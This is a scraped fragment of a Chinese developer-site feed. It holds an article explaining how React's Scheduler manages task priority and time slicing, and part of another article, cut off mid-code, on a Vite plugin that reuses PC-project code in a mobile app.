<p>这些，都可以在这份配置之上自然演进。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[React-Scheduler 调度器如何掌控主线程？]]></title>    <link>https://juejin.cn/post/7600787795477364782</link>    <guid>https://juejin.cn/post/7600787795477364782</guid>    <pubDate>2026-01-30T09:21:35.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7600787795477364782" data-draft-id="7600990891206475803" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="React-Scheduler 调度器如何掌控主线程？"/> <meta itemprop="keywords" content="前端,JavaScript,React.js"/> <meta itemprop="datePublished" content="2026-01-30T09:21:35.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="发现一只大呆瓜"/> <meta itemprop="url" content="https://juejin.cn/user/180747382561607"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            React-Scheduler 调度器如何掌控主线程？
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/180747382561607/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    发现一只大呆瓜
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-30T09:21:35.000Z" title="Fri Jan 30 2026 09:21:35 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-30
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h3 data-id="heading-0">前言</h3>
<p>在 React 18 的并发时代，<code>Scheduler（调度器）</code> 是实现非阻塞渲染的幕后英雄。它不只是 React 的一个模块，更是一个通用的、高性能的 JavaScript 任务调度库。它不仅让 React 任务可以“插队”，还让“长任务”不再阻塞浏览器 UI 渲染。</p>
<h2 data-id="heading-1">一、 核心概念：什么是 Scheduler？</h2>
<p>Scheduler 是一个独立的包，它通过与 React 协调过程（Reconciliation）的紧密配合，实现了任务的<strong>可中断、可恢复、带优先级</strong>执行。</p>
<h3 data-id="heading-2">主要职责</h3>
<ol>
<li><strong>优先级管理</strong>：根据任务紧急程度（如用户点击 vs 数据预取）安排执行顺序。</li>
<li><strong>空闲时间利用</strong>：在浏览器每一帧的空闲时间处理不紧急的任务。</li>
<li><strong>防止主线程阻塞</strong>：通过“时间片（Time Slicing）”机制，避免长任务导致页面假死。</li>
</ol>
<hr/>
<h2 data-id="heading-3">二、 Scheduler 的完整调度链路</h2>
<p>当一个 <code>setState</code> 触发后，Scheduler 内部会经历以下精密流程：</p>
<h3 data-id="heading-4">1. 任务创建与通知</h3>
<p>当状态更新时，React 不会立即执行 Render。它首先会创建一个 <code>Update</code>对象来记录这次变更，这个对象中包含这次更新所需的全部信息，例如更新后的状态值，<code>Lane</code>车道模型分配的任务优先级.</p>
<h3 data-id="heading-5">2. 优先级排序与队列维护</h3>
<ul>
<li>
<p><strong>任务优先级排序</strong>： 创建更新后，react会调用<code>scheduleUpdateOnFiber</code>函数通知<code>scheduler</code>调度器有个一个新的任务需要调度，这时<code>scheduler</code>会对该任务确定一个优先级，以及过期时间（优先级越高，过期时间越短，表示越紧急）</p>
</li>
<li>
<p><strong>队列维护</strong>： 接着<code>scheduler</code>会将该任务放入到循环调度中，<code>scheduler</code>对于任务循环调度在内部维护着两个队列，一个是立即执行队列<code>taskQueue</code>和延迟任务队列<code>timeQueue</code>，新任务会根据优先级进入到相应对列</p>
<ul>
<li><strong><code>timerQueue</code>（延时任务队列）</strong> ：存放还未到开始时间的任务，按开始时间排序。</li>
<li><strong><code>taskQueue</code>（立即任务队列）</strong> ：存放已经就绪的任务，按<strong>过期时间</strong>排序。优先级越高，过期时间越短。</li>
</ul>
</li>
</ul>
<h3 data-id="heading-6">3. 时间片的开启：MessageChannel</h3>
<p>将任务放入队列后，<code>scheduler</code>会调用<code>requetHostCallback</code>函数去请求浏览器在合适的时机去执行调度，该函数通过 <code>MessageChannel</code>对象中的<code>port.postMessage</code> 方法创建一个宏任务，浏览器在下一个宏任务时机触发 <code>port.onmessage</code>，并在这宏任务回调中启动 <code>workLoop</code>函数。</p>
<blockquote>
<p>补充：Scheduler 会调用 <code>requestHostCallback</code> 请求浏览器调度。它没有选择 <code>setTimeout</code>，而是选择了 <strong><code>MessageChannel</code></strong>。</p>
</blockquote>
<blockquote>
<p><strong>为什么选 MessageChannel？</strong> <code>setTimeout(fn, 0)</code> 在浏览器中通常有 4ms 的最小延迟，且属于宏任务中执行时机较晚的。<code>MessageChannel</code> 的 <code>port.postMessage</code> 产生的宏任务执行时机更早，且能更精准地在浏览器渲染帧之间切入。</p>
</blockquote>
<h3 data-id="heading-7">4. 工作循环：workLoop</h3>
<ul>
<li>
<p>在宏任务回调中，调度器会进入 <code>workLoop</code>。它会调用<code>performUnitOfWor</code>k函数循环地处理Fiber节点，对比新旧节点的<code>props、state</code>，并从队列中取出最紧急的任务交给 React 执行。</p>
</li>
<li>
<p><code>workLopp</code>中会包含一个<code>shouldYield</code>函数中断检查函数，用于检查当前时间片是否耗尽以及是否有更高优先级的任务执行，如果有的话则会将主线程控制权交还给浏览器，以保证高优先级任务（如用户输入、动画）能及时响应。</p>
</li>
</ul>
<hr/>
<h3 data-id="heading-8">5. 中断与恢复：shouldYield 的魔力</h3>
<p>在 <code>workLoop</code> 执行过程中，每一项单元工作完成后，都会调用 <strong><code>shouldYield()</code></strong> 函数进行“路况检查”。</p>
<ul>
<li><strong>中断条件</strong>：如果当前时间片（通常为 <strong>5ms</strong>）耗尽，或者检测到有更紧急的用户交互（高优任务插队），<code>shouldYield</code> 返回 <code>true</code>。</li>
<li><strong>状态保存</strong>：此时 React 会记录当前 <code>workInProgress</code> 树的位置，将控制权交还给浏览器。</li>
<li><strong>任务恢复</strong>：Scheduler 会在下一个时间片通过 <code>MessageChannel</code> 再次触发，从记录的位置继续执行，从而实现可恢复。</li>
</ul>
<h3 data-id="heading-9">6. 任务插队</h3>
<p>如果在执行一个低优先级任务时，有高优先级任务加入（如用户突然点击按钮），<code>Scheduler</code>会中断当前的低优任务并记录该位置，先执行高优任务。等高优任务完成后，再重新执行或继续之前的低优任务</p>
<hr/>
<h2 data-id="heading-10">三、 补充</h2>
<ol>
<li><strong>执行时机对比</strong>：<code>MessageChannel</code> 确实在宏任务中非常快，但在某些极其特殊的情况下（如没有 <code>MessageChannel</code> 的旧环境），它会回退到 <code>setTimeout</code>。</li>
<li><strong>饥饿现象防止</strong>：如果一个低优先级任务一直被插队怎么办？Scheduler 通过<strong>过期时间</strong>解决。一旦任务过期，它会从 <code>taskQueue</code> 中被提升为同步任务，强制执行。</li>
</ol></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[一个Vite插件实现PC到移动端项目的高效迁移方案]]></title>    <link>https://juejin.cn/post/7600868443832254483</link>    <guid>https://juejin.cn/post/7600868443832254483</guid>    <pubDate>2026-01-30T09:24:34.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7600868443832254483" data-draft-id="7600967006892752905" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="一个Vite插件实现PC到移动端项目的高效迁移方案"/> <meta itemprop="keywords" content="前端,JavaScript,Vite"/> <meta itemprop="datePublished" content="2026-01-30T09:24:34.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="浮幻云月"/> <meta itemprop="url" content="https://juejin.cn/user/1019992474918343"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            一个Vite插件实现PC到移动端项目的高效迁移方案
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1019992474918343/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    浮幻云月
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-30T09:24:34.000Z" title="Fri Jan 30 2026 09:24:34 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-30
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>当PC端项目需要迁移到移动端时，你是否还在手动复制粘贴代码？今天分享一个我们团队自研的Vite插件，帮你实现跨仓库、跨技术栈的代码高效复用！</p>
<h2 data-id="heading-0">背景：从PC到移动端的迁移之痛</h2>
<p>最近我们团队遇到了一个典型的企业级需求：<strong>将一个成熟的PC端医疗管理系统（MDM）迁移到移动端</strong>。听起来简单，但实际上却面临诸多挑战：</p>
<h3 data-id="heading-1">面临的挑战</h3>
<ol>
<li><strong>技术栈差异</strong>：PC端使用Element Plus，移动端需要Vant</li>
<li><strong>仓库隔离</strong>：PC端和移动端在不同的Git仓库</li>
<li><strong>代码复用</strong>：希望复用80%的业务逻辑，但UI组件完全不同</li>
<li><strong>维护同步</strong>：业务逻辑更新需要在两端同步</li>
</ol>
<p>传统的解决方案要么是<strong>完全重写</strong>（成本高），要么是<strong>复制粘贴</strong>（维护噩梦）,或者是<strong>Monorepo</strong> (代码和依赖放一起)。我们需要的是一种既能复用核心逻辑，代码在不同仓库维护，又能灵活定制UI的解决方案。</p>
<h2 data-id="heading-2">解决方案：vite-plugin-code-reuse</h2>
<p>基于这个需求，我们开发了 <code>vite-plugin-code-reuse</code> 插件，它的核心思想是：<strong>多仓库代码复用、智能替换、无缝集成</strong>。</p>
<h3 data-id="heading-3">插件核心能力</h3>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// 插件的核心配置结构</span>
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">PluginConfig</span> {
  <span class="hljs-attr">repositories</span>: <span class="hljs-title class_">RepositoryConfig</span>[];     <span class="hljs-comment">// 代码仓库配置</span>
  <span class="hljs-attr">repoImportMappings</span>: <span class="hljs-title class_">RepoImportMappings</span>[]; <span class="hljs-comment">// 路径映射，主要是规避不同仓库路径别名冲突问题</span>
  <span class="hljs-attr">importReplacements</span>: <span class="hljs-title class_">ImportReplacementConfig</span>[]; <span class="hljs-comment">// 导入替换</span>
}
</code></pre>
<h2 data-id="heading-4">实战案例：医疗管理系统迁移</h2>
<p>让我通过实际案例展示这个插件的效果。</p>
<h3 data-id="heading-5">项目背景</h3>
<ul>
<li><strong>PC端项目</strong>：<code>xlian-web-mdm</code>（Vue 3 + Element Plus + TypeScript）</li>
<li><strong>移动端项目</strong>：新建的H5项目（Vue 3 + Vant + TypeScript）</li>
<li><strong>目标</strong>：复用PC端80%的业务逻辑，100%替换UI组件</li>
</ul>
<h3 data-id="heading-6">第一步：安装配置插件</h3>
<pre><code class="hljs language-bash" lang="bash">npm install vite-plugin-code-reuse --save-dev
</code></pre>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// vite.config.ts</span>
<span class="hljs-keyword">import</span> { defineConfig } <span class="hljs-keyword">from</span> <span class="hljs-string">'vite'</span>
<span class="hljs-keyword">import</span> vue <span class="hljs-keyword">from</span> <span class="hljs-string">'@vitejs/plugin-vue'</span>
<span class="hljs-keyword">import</span> codeReusePlugin <span class="hljs-keyword">from</span> <span class="hljs-string">'vite-plugin-code-reuse'</span>
<span class="hljs-keyword">import</span> path <span class="hljs-keyword">from</span> <span class="hljs-string">'path'</span>

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title function_">defineConfig</span>({
  <span class="hljs-attr">plugins</span>: [
    <span class="hljs-title function_">vue</span>(),
    <span class="hljs-title function_">codeReusePlugin</span>({
      <span class="hljs-comment">// 1. 引入PC端代码仓库</span>
      <span class="hljs-attr">repositories</span>: [
        {
          <span class="hljs-attr">url</span>: <span class="hljs-string">'http://gitlab.xinglianhealth.com/web/mdm/xlian-web-mdm.git'</span>,
          <span class="hljs-attr">branch</span>: <span class="hljs-string">'master'</span>,
          <span class="hljs-attr">dir</span>: <span class="hljs-string">'mdm-pc'</span>  <span class="hljs-comment">// 本地存放目录</span>
        }
      ],
      
      <span class="hljs-comment">// 2. 修正路径别名映射,pc和移动都配置了“@”别名，需要各自引用正确的路径</span>
      <span class="hljs-attr">repoImportMappings</span>: [
        {
          <span class="hljs-attr">alias</span>: <span class="hljs-string">'@'</span>,
          <span class="hljs-attr">repoDir</span>: <span class="hljs-string">'mdm-pc'</span>,
          <span class="hljs-comment">// PC端中的“@”别名还是引用pc端目录下的代码，但是需要排除路由、状态管理等路径，引用移动端的，因为路由和store不能存在两个</span>
          <span class="hljs-attr">ignorePatterns</span>: [<span class="hljs-string">'src/router'</span>, <span class="hljs-string">'src/store'</span>, <span class="hljs-string">'src/axios'</span>]
        }
      ],
      
      <span class="hljs-comment">// 3. 智能导入替换，pc端的部分组件无法复用时，可以做替换</span>
      <span class="hljs-attr">importReplacements</span>: [
        <span class="hljs-comment">// 场景1：组件替换（Element Plus → Vant）</span>
        {
          <span class="hljs-attr">pattern</span>: <span class="hljs-regexp">/\/views\/MasterData\/components\/UploadFile\.vue$/</span>,
          <span class="hljs-attr">file</span>: <span class="hljs-string">'src/components/MbUpload.vue'</span> <span class="hljs-comment">// 移动端专用上传组件</span>
        },
        {
          <span class="hljs-attr">pattern</span>: <span class="hljs-regexp">/\/views\/MasterData\/components\/TextInput\.vue$/</span>,
          <span class="hljs-attr">file</span>: <span class="hljs-string">'src/components/MbTextInput.vue'</span> <span class="hljs-comment">// 移动端输入框</span>
        },
        
        <span class="hljs-comment">// 场景2：复杂表单组件替换</span>
        {
          <span class="hljs-attr">pattern</span>: <span class="hljs-regexp">/\/views\/MasterData\/components\/MasterForm\.vue$/</span>,
          <span class="hljs-attr">file</span>: <span class="hljs-string">'src/components/MbForm.vue'</span> <span class="hljs-comment">// 移动端表单封装</span>
        },
        
        <span class="hljs-comment">// 场景3：PC端特有功能在移动端隐藏</span>
        {
          <span class="hljs-attr">pattern</span>: <span class="hljs-regexp">/\/views\/MasterData\/components\/HeaderFilter\/HeaderFilter\.vue$/</span>,
          <span class="hljs-attr">code</span>: <span class="hljs-string">'&lt;template&gt;&lt;/template&gt;'</span> <span class="hljs-comment">// 移动端不需要复杂的表头筛选</span>
        },
        
        <span class="hljs-comment">// 场景4：UI库替换</span>
        {
          <span class="hljs-attr">pattern</span>: <span class="hljs-regexp">/^@?element-plus/</span>,
          <span class="hljs-attr">resolve</span>: path.<span class="hljs-title function_">resolve</span>(<span class="hljs-string">'src/components/ElementPlus.ts'</span>) <span class="hljs-comment">// 重定向到兼容层</span>
        }
      ]
    })
  ]
})
</code></pre>
<h3 data-id="heading-7">第二步：UI组件替换</h3>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// src/components/ElementPlus.ts - UI库兼容层</span>
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">Button</span>, <span class="hljs-title class_">Input</span>, <span class="hljs-title class_">Select</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'./ui-adaptor'</span>

<span class="hljs-comment">// 创建Element Plus到Vant的映射</span>
<span class="hljs-keyword">export</span> {
  <span class="hljs-title class_">ElButton</span>: <span class="hljs-title class_">Button</span>,
  <span class="hljs-title class_">ElInput</span>: <span class="hljs-title class_">Input</span>,
  <span class="hljs-title class_">ElSelect</span>: <span class="hljs-title class_">Select</span>,
  <span class="hljs-comment">// ... 更多映射</span>
}

<span class="hljs-comment">// src/components/ui-adaptor.ts - UI库适配层,以Button组件为例</span>

&lt;template&gt;<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">van-button</span> <span class="hljs-attr">v-bind</span>=<span class="hljs-string">"$attrs"</span> /&gt;</span></span>&lt;/template&gt;
<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">const</span> props = <span class="hljs-title function_">defineProps</span>({
<span class="hljs-comment">// 对element-plus Button Props做适配，比如size不支持"medium"，可以处理成其他的,相同的属性不用处理</span>
})
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span>
</code></pre>
<h3 data-id="heading-8">第三步：复用业务逻辑组件</h3>
<pre><code class="hljs language-vue" lang="vue">&lt;!-- src/views/MasterData/PatientList.vue --&gt;
&lt;template&gt;
  &lt;!-- 复用PC端的模板结构，但使用移动端组件 --&gt;
  &lt;div class="patient-list"&gt;
    &lt;!-- 搜索框（PC端是ElInput，自动替换为Vant Field） --&gt;
    &lt;van-field 
      v-model="searchKey"
      placeholder="搜索患者"
      @input="handleSearch"
    /&gt;
    
    &lt;!-- 患者列表 --&gt;
    &lt;van-list 
      v-model:loading="loading"
      :finished="finished"
      @load="loadPatients"
    &gt;
      &lt;patient-item 
        v-for="patient in patients"
        :key="patient.id"
        :patient="patient"
        @click="handlePatientClick"
      /&gt;
    &lt;/van-list&gt;
  &lt;/div&gt;
&lt;/template&gt;

&lt;script setup lang="ts"&gt;
// 这里直接复用PC端的业务逻辑！
import { usePatientList } from '@/mdm-pc/src/views/MasterData/composables/usePatientList'

// 完全复用PC端的逻辑，包括：
// 1. 数据获取逻辑
// 2. 搜索过滤逻辑  
// 3. 分页逻辑
// 4. 事件处理逻辑
const {
  patients,
  loading,
  finished,
  searchKey,
  loadPatients,
  handleSearch,
  handlePatientClick
} = usePatientList()
&lt;/script&gt;

&lt;style scoped&gt;
/* 移动端特有的样式 */
.patient-list {
  padding: 12px;
}
&lt;/style&gt;
</code></pre>
<h2 data-id="heading-9">插件的核心实现原理</h2>
<h3 data-id="heading-10">1. 代码仓库管理</h3>
<p>vite build start开始时，自动拉取PC端仓库代码，如无更新不会重复拉取，默认只拉取一个commit，速度极快。</p>
<pre><code class="hljs language-js" lang="js">{
  <span class="hljs-attr">url</span>: <span class="hljs-string">'http://gitlab.xinglianhealth.com/web/mdm/xlian-web-mdm.git'</span>, <span class="hljs-comment">//仓库地址</span>
  <span class="hljs-attr">branch</span>: <span class="hljs-string">'master'</span>, <span class="hljs-comment">// 仓库分支</span>
